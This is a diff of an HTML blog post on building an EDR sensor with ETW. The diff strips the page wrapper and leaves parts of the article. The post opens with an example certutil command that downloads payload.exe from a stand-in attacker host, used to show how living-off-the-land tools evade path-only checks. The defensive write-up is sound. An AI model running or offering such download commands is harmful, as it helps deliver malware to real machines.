@@ -1,46 +1,3 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self'; style-src 'self'; font-src 'self'; img-src 'self'; connect-src https://formspree.io; form-action https://formspree.io; base-uri 'self'; object-src 'none'; upgrade-insecure-requests;">
-<meta name="referrer" content="no-referrer">
-<title>Where Did That Process Go? Building an EDR Part 1 | Aadil Varshani</title>
-<meta name="description" content="Building an EDR sensor from scratch: how ETW works, the acquisition-vs-enrichment split, and the wall I hit trying to get a ProcessStart event on Windows 11.">
-<link rel="canonical" href="https://aadilvarshani.github.io/blog/building-an-edr-part-1.html">
-<meta property="article:published_time" content="2026-07-15">
-<link rel="icon" type="image/svg+xml" href="../assets/favicon.svg">
-<link rel="apple-touch-icon" href="../assets/apple-touch-icon.png">
-<link rel="preload" href="../assets/fonts/bricolage-grotesque-latin-opsz.woff2" as="font" type="font/woff2" crossorigin>
-<link rel="preload" href="../assets/fonts/ibm-plex-mono-latin-400.woff2" as="font" type="font/woff2" crossorigin>
-<link rel="stylesheet" href="../css/site.css">
-<script src="../js/theme-init.js"></script>
-</head>
-<body class="page-post">
-
-<header class="site-bar">
-  <a class="site-bar__name" href="../index.html">Aadil Varshani</a>
-  <nav class="site-bar__nav" aria-label="Main">
-    <a href="../blog/index.html">Writing</a>
-    <a href="../contact.html">Contact</a>
-    <a href="https://github.com/aadilvarshani" target="_blank" rel="noopener noreferrer">GitHub</a>
-    <a href="https://linkedin.com/in/aadil-varshani" target="_blank" rel="noopener noreferrer">LinkedIn</a>
-    <button class="theme-toggle" type="button" data-theme-toggle hidden>Dark</button>
-  </nav>
-</header>
-
-<main>
-  <header class="post-header" data-seat="sensor">
-    <div class="seat__texture" aria-hidden="true">ETW PEB CNG Authenticode JSONL EQL ETW PEB CNG</div>
-    <div class="post-header__inner">
-      <a class="post-header__series" href="../reaperwatch.html">Building an EDR</a>
-      <span class="post-header__meta">Part 1, 15 Jul 2026</span>
-    </div>
-  </header>
-
-  <article class="reading">
-    <h1 class="post-title">Where Did That Process Go? Building an EDR Part 1</h1>
-    <div class="prose">
 <pre><code>certutil -urlcache -f http://evil.site/payload.exe update.exe</code></pre>
 
 <p>If you saw that command run on a machine you were responsible for, you'd know instantly something was wrong. <a href="https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/certutil" target="_blank" rel="noopener noreferrer">certutil</a> is a legitimate, Microsoft signed binary that ships with every copy of Windows. It's also one of the most abused living off the land tools out there, because a path only check sees nothing suspicious here. <code>C:\Windows\System32\certutil.exe</code> is exactly where it's supposed to be, signed by exactly who you'd expect. The command line is the entire attack.</p>
@@ -215,18 +172,3 @@ id=21  count=2386  // ThreadWorkOnBehalfUpdate</code></pre>
 <p>That's the acquisition-versus-enrichment split from the start of this post catching up with me. A user-mode agent, however careful, only finds out after the fact. Closing that gap means moving acquisition into the kernel, the half I deferred at the beginning. That's Part 2.</p>
 
 <p>This is Part 1 of a series I'm building in public. The agent as it stands today is one phase, user mode, ETW-based, with the enrichment pipeline above. Part 2 covers moving acquisition into the kernel and what actually closing the TOCTOU gap from the last section takes.</p>
-    </div>
-
-    <nav class="series-path" data-seat="sensor" aria-label="Building an EDR series">
-      <p class="series-path__title">Building an EDR</p>
-      <ol class="path-strip">
-      <li class="path-strip__step path-strip__step--current"><b>Part 1</b><span>Where did that process go?</span></li>
-      </ol>
-      <p class="series-path__nav"><a href="../reaperwatch.html">All of Building an EDR</a><a href="index.html">All writing</a></p>
-    </nav>
-  </article>
-</main>
-
-<script src="../js/theme-toggle.js" defer></script>
-</body>
-</html>
